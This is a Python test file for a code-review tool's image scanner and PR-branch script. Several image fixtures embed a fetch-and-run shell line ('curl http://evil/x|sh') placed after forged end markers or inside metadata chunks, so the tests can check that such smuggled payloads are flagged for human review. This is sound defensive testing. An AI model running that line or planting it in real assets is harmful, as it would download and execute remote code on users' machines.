"""Failing-first regressions for re-audit v18: real container walks."""

import json
import subprocess
import sys

import pytest

from review import pr_step
from review.scanners import plain
from image_fixtures import chunk, jpeg, png, segment

REAL_TEXt = b"Software\x00Matplotlib version3.11.1, https://matplotlib.org/"


def test_png_payload_with_forged_iend_needs_person():
    forged = png() + b"#!/bin/sh\ncurl http://evil/x|sh\n" + chunk(b"IEND", b"")
    assert plain.assess_binary("docs/a.png", forged) == (True, False)


def test_png_with_bad_crc_needs_person():
    data = bytearray(png())
    data[41] ^= 0xFF  # first IDAT data byte; its CRC is now stale
    assert plain.assess_binary("docs/a.png", bytes(data)) == (True, False)


def test_png_text_chunk_with_payload_needs_person():
    data = png(extra=[chunk(b"tEXt", b"Comment\x00#!/bin/sh\ncurl http://evil/x|sh\n")])
    assert plain.assess_binary("docs/a.png", data) == (True, False)


def test_achyudh_png_chunk_sequence_is_plain_image():
    # The real docs/benchmark_matrix_summary.png @ b540a4b9 walks as
    # IHDR, tEXt(58), pHYs, IDAT x5, IEND. Its tEXt keyword is Software.
    data = png(extra=[chunk(b"tEXt", REAL_TEXt), chunk(b"pHYs", b"\x00" * 9)])
    assert plain.assess_binary("docs/benchmark_matrix_summary.png", data) == (False, True)


def test_jpeg_payload_with_forged_eoi_needs_person():
    forged = jpeg() + b"#!/bin/sh\ncurl http://evil/x|sh\n" + b"\xff\xd9"
    assert plain.assess_binary("docs/a.jpg", forged) == (True, False)


def test_jpeg_with_com_segment_needs_person():
    assert plain.assess_binary("a.jpg", jpeg(extra=[segment(0xFE, b"payload")])) == (True, False)


def test_jpeg_segments_are_never_trusted():
    # Even well-formed Exif and ICC segments need a person: entropy is not decoded.
    for payload in (
        segment(0xE1, b"Exif\x00\x00" + b"\x00" * 8),
        segment(0xE1, b"http://evil/x"),
        segment(0xE3, b"payload"),
        segment(0xE2, b"ICC_PROFILE\x00" + b"\x00" * 8),
    ):
        assert plain.assess_binary("a.jpg", jpeg(extra=[payload])) == (True, False)


def test_gif_webp_ico_always_need_person():
    gif = b"GIF89a" + b"\x00" * 32 + b"payload" + b"\x3b"
    body = b"VP8 " + b"\x00" * 32 + b"payload"
    webp = b"RIFF" + (len(body) + 4).to_bytes(4, "little") + b"WEBP" + body
    ico = b"\x00\x00\x01\x00\x01\x00" + b"\x00" * 32
    assert plain.assess_binary("a.gif", gif) == (True, False)
    assert plain.assess_binary("a.webp", webp) == (True, False)
    assert plain.assess_binary("a.ico", ico) == (True, False)


def test_uppercase_jpeg_suffix_still_needs_person():
    assert plain.assess_binary("docs/A.JPEG", jpeg()) == (True, False)
    assert plain.assess_binary("docs/A.JPEG", jpeg() + b"x") == (True, False)


def test_clean_png_is_a_plain_asset():
    assert plain.assess_binary("docs/a.png", png()) == (False, True)
    assert plain.assess_binary("docs/a.jpg", jpeg()) == (True, False)


def test_magic_inside_verified_idat_is_not_a_finding():
    # IDAT is validated by inflation, never magic-scanned: these are pixels.
    raw = b"\x00" + b"\x7fELF" + b"PK\x03\x04" + b"\x00" * 7
    assert plain.assess_binary("docs/a.png", png(width=5, raw=raw)) == (False, True)


def test_magic_in_a_non_image_still_needs_person():
    data = b"x = 1\n" + b"\x00" * 100 + b"\x7fELF" + b"\x00" * 100
    assert plain.assess_binary("src/a.py", data) == (True, False)


def setup_repo(tmp_path, monkeypatch):
    remote, work = tmp_path / "remote.git", tmp_path / "work"
    subprocess.run(["git", "init", "--bare", str(remote)], check=True, capture_output=True)
    work.mkdir()
    for args in (
        ("init", "-b", "main"), ("config", "user.email", "t@e"), ("config", "user.name", "T"),
    ):
        subprocess.run(["git", "-C", str(work), *args], check=True, capture_output=True)
    (work / "reviews").mkdir()
    (work / "reviews" / "a.json").write_text(json.dumps({"verdict": "seed", "blocks": []}))
    subprocess.run(["git", "-C", str(work), "add", "."], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "commit", "-m", "seed"], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "remote", "add", "origin", str(remote)], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "push", "-u", "origin", "main"], check=True, capture_output=True)
    monkeypatch.chdir(work)
    monkeypatch.setattr(sys, "argv", ["pr_step"])
    return work, remote


def test_pr_step_aborts_when_fetch_fails(tmp_path, monkeypatch, capsys):
    work, _ = setup_repo(tmp_path, monkeypatch)
    real_run = pr_step._run
    monkeypatch.setattr(pr_step, "_run", lambda args: subprocess.CompletedProcess(args, 0, "", "")
                        if args[0] == "gh" else real_run(args))
    (work / "reviews" / "a.json").write_text(json.dumps({"verdict": "one", "blocks": []}))
    pr_step.main()

    def failing(args):
        if args[:2] == ["git", "fetch"]:
            return subprocess.CompletedProcess(args, 128, "", "fatal: unable to access origin")
        return subprocess.CompletedProcess(args, 0, "", "") if args[0] == "gh" else real_run(args)

    monkeypatch.setattr(pr_step, "_run", failing)
    (work / "reviews" / "a.json").write_text(json.dumps({"verdict": "two", "blocks": []}))
    with pytest.raises(SystemExit):
        pr_step.main()
    out = capsys.readouterr().out
    assert "unable to access origin" in out
    assert "create and approve pull requests" not in out


def test_pr_step_aborts_when_ls_remote_errors(tmp_path, monkeypatch, capsys):
    work, remote = setup_repo(tmp_path, monkeypatch)
    real_run = pr_step._run
    pushed = []

    def failing(args):
        if args[:2] == ["git", "ls-remote"]:
            return subprocess.CompletedProcess(args, 128, "", "fatal: could not read from remote")
        if args[:2] == ["git", "push"]:
            pushed.append(args)
        return subprocess.CompletedProcess(args, 0, "", "") if args[0] == "gh" else real_run(args)

    monkeypatch.setattr(pr_step, "_run", failing)
    with pytest.raises(SystemExit):
        pr_step.main()
    assert not pushed, "an ls-remote error must not fall through to the first-run push"
    assert "could not read from remote" in capsys.readouterr().out


def test_pr_step_missing_branch_is_the_first_run_path(tmp_path, monkeypatch):
    work, remote = setup_repo(tmp_path, monkeypatch)
    real_run = pr_step._run
    monkeypatch.setattr(pr_step, "_run", lambda args: subprocess.CompletedProcess(args, 0, "", "")
                        if args[0] == "gh" else real_run(args))
    (work / "reviews" / "a.json").write_text(json.dumps({"verdict": "one", "blocks": []}))
    pr_step.main()
    branch = f"review/weekly-{pr_step.week()}"
    assert subprocess.run(["git", "--git-dir", str(remote), "rev-parse", branch],
                          capture_output=True, text=True).returncode == 0
